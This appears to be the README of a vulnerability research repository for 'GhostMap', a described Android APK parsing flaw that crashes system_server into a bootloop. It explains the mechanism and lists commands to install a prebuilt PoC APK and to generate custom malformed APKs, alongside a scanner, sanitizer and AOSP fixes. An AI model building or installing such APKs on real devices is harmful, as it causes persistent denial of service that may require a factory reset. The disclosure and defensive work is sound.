# Android GhostMap Vulnerability: Proof of Concept & Defense Toolkit

A vulnerability research toolkit and working Proof of Concept (PoC) for **GhostMap**, an Android parser-differential vulnerability in `libziparchive` and `libandroidfw` disclosed by Bitdefender Labs in late 2026.

This repository provides:
- A pre-built, signed, and 4-byte aligned PoC APK ready for emulator testing (`apk/ghostmap-poc.apk`).
- Complete Android Studio source code for the target application (`android-src/`).
- A Python research toolkit to generate, scan, sign, and sanitize GhostMap APK packages (`src/ghostmap/`).
- Full technical vulnerability documentation and AOSP remediation patches (`docs/`).

---

## Vulnerability Summary

| Parameter | Detail |
| :--- | :--- |
| **Vulnerability Name** | GhostMap |
| **Class** | Parser Differential / Unhandled Memory Fault (`SIGBUS`) |
| **Affected Components** | Android `libziparchive` vs `libandroidfw` |
| **Affected Versions** | Android 10, 11, 12, 13, 14, 15, 16, 17 |
| **Required Permissions** | None (0-permission) |
| **Interaction Required** | None (Triggers automatically during package scanning/intake) |
| **Impact** | Persistent denial of service (`system_server` crash / unrecoverable bootloop) |

### How It Works

1. **The Discrepancy**: When Android processes an APK, `libziparchive` checks whether an entry's uncompressed length exceeds allowable archive bounds **only** if the compression method is `0` (`kCompressStored`). If a non-standard method (e.g., `99`) is provided, `libziparchive` bypasses boundary validation.
2. **The Memory Mapping Fault**: `libandroidfw` (`Asset.cpp`) checks whether the entry method is `8` (`kCompressDeflated`). If it is not deflated, it treats the entry as uncompressed and issues an `mmap()` call using the entry's declared `uncompressed_length` (e.g., 16 MB), regardless of the actual file size on disk (e.g., 41 bytes).
3. **The SIGBUS Crash**: The Linux kernel creates virtual memory mappings for the requested 16 MB, but only backing pages up to byte 41 exist. When `system_server` attempts to read past byte 41 while parsing resources, the MMU triggers a hardware page fault that cannot be serviced, delivering a fatal `SIGBUS` (`BUS_ADRERR`) signal.
4. **The Bootloop**: Because Android automatically restarts `system_server`, the service restarts, rescans the installed application, triggers the same fault, and crashes again. This crash occurs before Safe Mode protections take effect.

---

## Repository Structure

```
├── README.md
├── LICENSE
├── .gitignore
├── pyproject.toml
│
├── apk/
│   ├── ghostmap-poc.apk        # Signed & aligned vulnerable PoC APK
│   └── ghostmap-clean.apk      # Signed & aligned sanitized reference APK
│
├── android-src/                # Android Studio Gradle project
│   ├── build.gradle
│   ├── settings.gradle
│   └── app/
│       ├── build.gradle
│       └── src/main/
│           ├── AndroidManifest.xml
│           ├── java/com/ghostmap/poc/MainActivity.java
│           └── res/values/strings.xml
│
├── src/
│   └── ghostmap/
│       ├── __init__.py
│       ├── zip_utils.py        # PKWARE ZIP binary parsing and header structures
│       ├── analyzer.py         # Dual-engine parser simulation (libziparchive vs libandroidfw)
│       ├── generator.py        # APK synthesizer and header mutation engine
│       ├── signer.py           # v1 JAR signing and 4-byte zipalign implementation
│       ├── remediation.py      # Automated sanitizer and AOSP patch definitions
│       └── cli.py              # Command-line interface
│
├── tests/
│   └── test_ghostmap.py        # Automated test suite
│
└── docs/
    └── VULNERABILITY_ANALYSIS.md # Detailed technical breakdown and AOSP diffs
```

---

## Quick Start: Testing the PoC

> **IMPORTANT WARNING**: Only test this PoC on an **Android Emulator (AVD)** or an isolated development device with USB debugging enabled. If installed on a device without active ADB access, recovering from the resulting bootloop may require a hardware factory reset.

### 1. Verify Connected Emulator

```bash
adb devices
```

### 2. Monitor Crash Logs in Real Time

In a separate terminal window, start listening for `SIGBUS` signals and `system_server` crashes:

```bash
adb logcat -s "DEBUG" "AndroidRuntime" "AssetManager" "system_server"
```

### 3. Install the PoC APK

```bash
adb install apk/ghostmap-poc.apk
```

Observe the `SIGBUS (BUS_ADRERR)` signal delivered to the process handling resource extraction.

### 4. Recovery via ADB

If your emulator enters a crash loop, remove the package before the next restart cycle:

```bash
adb uninstall com.ghostmap.poc
```

---

## Using the Python Toolkit

The toolkit requires Python 3.8+ and uses only standard library modules (no third-party dependencies required).

### Run Test Suite

```bash
PYTHONPATH=src python3 -m unittest discover -s tests -v
```

### Scan an APK for GhostMap Flaws

Scan any APK to determine whether it contains mismatched compression methods and inflated memory bounds:

```bash
PYTHONPATH=src python3 -m ghostmap.cli scan apk/ghostmap-poc.apk
```

Example scan output:
```
[*] Scanning 'apk/ghostmap-poc.apk' (3,318 bytes)...

[!] Found 1 anomalous entry(s):

  [GHOSTMAP VULNERABILITY] resources.arsc
    Method: 99 | Compressed: 41 | Declared: 16,777,216
    libziparchive -> Method 99 bypasses bounds check (only checked when method == 0)
    libandroidfw  -> Method 99 treated as stored, mmap(16777216 bytes) exceeds file boundary by 16776773 bytes -> SIGBUS on read

[!] VERDICT: This APK triggers the GhostMap SIGBUS crash loop.
```

### Generate a Custom PoC APK

```bash
PYTHONPATH=src python3 -m ghostmap.cli generate -o custom_poc.apk -t resources.arsc -m 99 -s 16777216
```

### Sign and 4-Byte Align an APK

```bash
PYTHONPATH=src python3 -m ghostmap.cli sign custom_poc.apk -o custom_poc_signed.apk
```

### Sanitize and Fix an Affected APK

The sanitizer resets non-standard compression methods to standard stored format and clamps the declared uncompressed size to the actual physical payload size:

```bash
PYTHONPATH=src python3 -m ghostmap.cli sanitize apk/ghostmap-poc.apk -o fixed.apk
PYTHONPATH=src python3 -m ghostmap.cli scan fixed.apk
```

---

## Building the Android Source Project

The `android-src/` directory contains a minimal native Android project.

1. Open Android Studio.
2. Select **Open** and navigate to `android-src/`.
3. Allow Gradle to synchronize.
4. Run or build the project using standard Gradle tasks:
   ```bash
   cd android-src
   ./gradlew assembleDebug
   ```

The compiled APK will be generated under `android-src/app/build/outputs/apk/debug/app-debug.apk`. You can then mutate and sign it using `ghostmap.cli` to reproduce the vulnerability on custom builds.

---

## Defensive Remediation

To resolve the vulnerability at the OS level, two changes are required in AOSP:

1. **`system/libziparchive/zip_archive.cc`**: Reject any entry that specifies a compression method other than `kCompressStored` (`0`) or `kCompressDeflated` (`8`).
2. **`frameworks/base/libs/androidfw/Asset.cpp`**: Explicitly verify `method == kCompressStored` before invoking `mmap()`, and check that `uncompressed_length <= physical_length`.

See [`docs/VULNERABILITY_ANALYSIS.md`](docs/VULNERABILITY_ANALYSIS.md) for full patch diffs.

---

## License

This project is released under the [MIT License](LICENSE).
